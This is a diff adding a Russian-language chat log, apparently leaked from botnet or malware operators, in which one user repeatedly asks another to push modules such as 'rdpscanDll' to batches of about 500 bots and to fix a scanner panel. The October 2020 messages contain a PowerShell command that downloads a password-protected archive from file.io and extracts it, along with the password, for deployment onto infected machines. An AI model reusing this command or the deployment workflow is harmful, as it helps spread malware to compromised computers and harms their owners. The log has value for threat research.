@@ -1,0 +1,58 @@
+Timestamp	From	To	Message
+2020-06-24 12:38:04.253304	defender	ali	ЕЩЕ РАЗ ВСЕМ кто не скинул мне свою резервную жабу, скиньте сейчас! Чтобы с вами был контакт если эта жаба накроется. Она сейчас не стабильная. Если аккаунта нет, регайте на любой сервисе exploit.im, xmpp.jp, jabb.im, jabber.ru и других
+2020-06-24 13:40:03.356990	defender	ali	ЕЩЕ РАЗ ВСЕМ кто не скинул мне свою резервную жабу, скиньте сейчас! Чтобы с вами был контакт если эта жаба накроется. Она сейчас не стабильная. Если аккаунта нет, регайте на любой сервисе exploit.im, xmpp.jp, jabb.im, jabber.ru и других
+2020-07-28 09:25:57.817358	defender	ali	привет поставил
+2020-07-28 19:49:30.654900	defender	ali	привет поставил
+2020-07-28 19:49:47.201376	ali	defender	гуд
+2020-08-07 11:48:06.733432	defender	ali	привет, сейчас разберемся
+2020-08-07 16:05:40.527658	defender	ali	привет, сейчас разберемся
+2020-08-21 16:10:48.867388	ali	defender	привет
+2020-08-21 16:11:17.265076	ali	defender	добавь плз ботов на rdpscanDll. так же штук 500
+2020-08-21 18:30:25.492128	ali	defender	[19:10:48] <Ali> привет 
+[19:11:16] <Ali> добавь плз ботов на rdpscanDll. так же штук 500
+2020-09-05 15:51:28.122617	ali	defender	Привет
+2020-09-05 15:51:33.332925	ali	defender	vscanner панель упала
+2020-09-05 15:51:42.472190	ali	defender	Кому писать по этому поводу?
+2020-09-05 15:52:02.056687	ali	defender	Добавь ботов еще плз шт 500 туда
+2020-09-05 17:06:33.615721	ali	defender	Привет
+2020-09-05 17:06:33.617267	ali	defender	vscanner панель упала
+2020-09-05 17:06:33.618562	ali	defender	Кому писать по этому поводу?
+2020-09-05 17:06:33.619720	ali	defender	Добавь ботов еще плз шт 500 туда
+2020-10-15 12:10:07.796121	defender	ali	то есть это тоже модуль?
+2020-10-15 17:12:07.010406	defender	ali	то есть это тоже модуль?
+2020-10-16 12:55:40.373437	defender	ali	то есть это тоже модуль?
+2020-10-20 20:05:32.015303	ali	defender	[15.10.2020 14:27:05] <Ali> Dowload URL:
+https://file.io/g7cCNXUHTWJw
+Pass:
+3j@d$j6+6=oEq&Lxmthv
+Download command:
+powershell (new-object System.Net.WebClient).DownloadFile('https://file.io/g7cCN
+XUHTWJw', '1.rar') ; & "c:\Program files\WinRar\unrar.exe" x -p"3j@d$j6+6=oEq&Lx
+mthv" 1.rar
+
+этот модуль загрузить на ботов
+500 шт
+
+
+и rdpscanDll тоже на 500 ботов
+2020-10-20 20:30:36.448387	ali	defender	[15.10.2020 14:27:05] <Ali> Dowload URL:
+https://file.io/g7cCNXUHTWJw
+Pass:
+3j@d$j6+6=oEq&Lxmthv
+Download command:
+powershell (new-object System.Net.WebClient).DownloadFile('https://file.io/g7cCN
+XUHTWJw', '1.rar') ; & "c:\Program files\WinRar\unrar.exe" x -p"3j@d$j6+6=oEq&Lx
+mthv" 1.rar
+
+этот модуль загрузить на ботов
+500 шт
+
+
+и rdpscanDll тоже на 500 ботов
+2020-10-29 19:46:37.221205	ali	defender	Привет
+2021-08-10 10:50:45.812341	ali	defender	Привет
+2021-08-10 10:51:04.627865	ali	defender	Сделай плз акк джаббера один
+2021-08-10 10:57:12.576633	ali	defender	Привет
+2021-08-10 10:57:12.576830	ali	defender	Сделай плз акк джаббера один
+2021-10-21 18:36:30.428529	ali	defender	Привет
+2021-12-27 21:41:11.402455	ali	defender	привет
